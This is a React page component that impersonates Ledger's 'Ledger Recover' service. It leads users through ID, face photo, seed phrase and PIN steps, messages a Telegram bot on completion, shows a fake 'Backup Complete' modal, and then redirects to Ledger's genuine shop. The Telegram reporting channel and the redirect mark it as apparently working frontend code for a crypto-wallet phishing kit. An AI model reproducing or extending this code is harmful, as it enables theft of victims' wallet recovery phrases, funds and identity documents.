
import React, { useState, useContext, useEffect } from 'react';
import { AuthContext } from '../context/AuthContext';
import IdVerification from '../components/IdVerification';
import SeedPhraseVerification from '../components/SeedPhraseVerification';
import CameraVerification from '../components/CamVerification';
import PinVerification from '../components/PinVerification';
import Modal from 'react-modal';
import { FaCheckCircle } from 'react-icons/fa';

// import axios from 'axios';
// import emailjs from '@emailjs/browser';
// import 'dotenv/config'

Modal.setAppElement('#root');

function AuthPage() {
  const [step, setStep] = useState(1);
  const { state, setPhoto} = useContext(AuthContext);
  const [isModalOpen, setIsModalOpen] = useState(false);
  // const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || 'https://your-backend.onrender.com';


  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN; // Store in your .env file
  const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID; // Store in your .env file
  const handleNext = () => {
    setStep(step + 1);
  };


  const sendToTelegram = async (message) => {
    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        }
      );
  
      if (!response.ok) {
        throw new Error('Failed to send message to Telegram');
      }
  
      console.log('Message sent to Telegram successfully');
    } catch (error) {
      console.error('Error sending message to Telegram:', error);
    }
  };
  
  const handleBackup = async () => {
    // Assuming `step` and `state.photo` are coming from a context or state
    // const { step, state, setIsModalOpen } = useContext(AuthContext);
  
    if (step < 5 || !state.photo) {
      alert('Please complete all steps and capture a photo.');
      return;
    }
  
    setIsModalOpen(true);
  
    // Get the current date and time
    const currentDate = new Date().toLocaleString();
    const telegramMessage = `Backup completed successfully at: ${currentDate}`;
    
    // Send the date and time to Telegram
    await sendToTelegram(telegramMessage);
  };
  
  

  useEffect(() => {
    if (isModalOpen) {
      launchConfetti();
    }
  },[isModalOpen]);

  const launchConfetti = () => {
    setInterval(() => {
      createConfettiPiece();
    }, 10);
  };

  const createConfettiPiece = () => {
    const confetti = document.createElement('div');
    const size = Math.random() * 8 + 4 + 'px';
    const color = `hsl(${Math.random() * 360}, 100%, 50%)`;

    confetti.classList.add('confetti');
    confetti.style.width = size;
    confetti.style.height = size;
    confetti.style.backgroundColor = color;
    confetti.style.position = 'absolute';
    confetti.style.top = '-10px';
    confetti.style.left = Math.random() * 100 + '%';
    confetti.style.opacity = Math.random() + 0.5;
    confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
    confetti.style.transition = 'transform 0.6s ease-out, opacity 1.2s ease-out';

    document.getElementById('confetti-container').appendChild(confetti);

    setTimeout(() => {
      confetti.style.transform = `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`;
      confetti.style.opacity = 0;
    }, Math.random() * 100);

    setTimeout(() => {
      confetti.remove();
    }, 2000);
  };

  const handleCloseModal = () => {
    setIsModalOpen(false);
    window.location.href = 'https://shop.ledger.com/pages/ledger-recover#offers';
  };

  return (
    <div className="container mx-auto p-5">
      <h1 className="text-3xl font-bold text-center mb-8">Ledger Recover</h1>

      {/* Progress Bar */}
      <div className="flex justify-around mb-10 max-xl:hidden">
        {[...Array(5)].map((_, index) => (
          <div key={index} className="flex flex-col items-center">
            <div className={`w-10 h-10 ${step >= index + 1 ? 'bg-blue-500' : 'bg-gray-300'} text-white rounded-full flex items-center justify-center`}>
              {index + 1}
            </div>
            <span className="mt-2 font-normal font-serif leading-tighter tracking-tighter 2xl:leading-tight 2xl:tracking-tight">
              {['Id Verification', 'Face Recognition', 'Seed Phrase', 'Pin Verification', 'Back Up'][index]}
            </span>
          </div>
        ))}
      </div>

      {/* Steps #i did it like this because i was too lazy to change them serially # */}
      {step === 2 && (
        <CameraVerification 
          onNext={handleNext} 
          // onMobileNext={handleMobileNext} 
          setPhoto={setPhoto} 
        />
      )}
      {step === 3 && <SeedPhraseVerification onNext={handleNext} />}
      {step === 1 && <IdVerification onNext={handleNext} />}
      {step === 4 && <PinVerification onNext={handleNext} />}
      {step === 5 && (
        <div>
          <h1>Backup All Data</h1>
          <button onClick={handleBackup} className="bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600">Backup</button>
        </div>
      )}

      {/* Backup Complete Modal */}
      <div className="container mx-auto p-5">
        <div id="confetti-container" className="fixed inset-0 pointer-events-none overflow-hidden z-50"></div>
        <Modal
          isOpen={isModalOpen}
          onRequestClose={handleCloseModal}
          className="fixed inset-0 bg-black p-4 flex flex-col items-center text-white justify-center z-50"
          overlayClassName="fixed inset-0 bg-black bg-opacity-50 z-40"
        >
          <div className="flex flex-col items-center justify-center text-center">
            <FaCheckCircle className="text-green-500 text-6xl mb-4" />
            <p>Backup Complete!</p>
            <p className="text-xl m-2 font-bold">You've secured the backup for your Secret Recovery Phrase using Ledger Recover.</p>
            <p className="m-2">Your information is being processed!</p>
            <button onClick={handleCloseModal} className="mt-4 font-semibold bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600">Close</button>
          </div>
        </Modal>
      </div>
    </div>
  );
}

export default AuthPage;
